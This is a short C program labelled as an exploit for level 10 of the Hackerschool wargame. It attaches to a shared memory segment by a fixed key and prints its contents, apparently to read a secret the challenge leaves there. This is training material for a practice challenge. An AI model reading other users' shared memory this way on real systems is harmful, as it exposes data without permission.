/*
 * Author : superdk@hanmail.net
 * DATA : exploit about level10 of hackerschool
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024

int main()
{
    void *sharedMemory = (void *)0;
    int sharedMemID;
    char buf[BUFFSIZE];
    key_t keyval = 7530;
    
    /* read data from shared memory */
    sharedMemID = shmget(keyval, BUFFSIZE, 0666);
    
    /* attach shared memory on process */
    sharedMemory = shmat(sharedMemID, (void *)0, 0);
    
    /* copy data from shared memory to specified buffer */
    memcpy(buf, sharedMemory, BUFFSIZE);
    printf("%s", buf);
    
    /* detach shared memory from process */
    shmdt(sharedMemory);
    
    return 0;
}


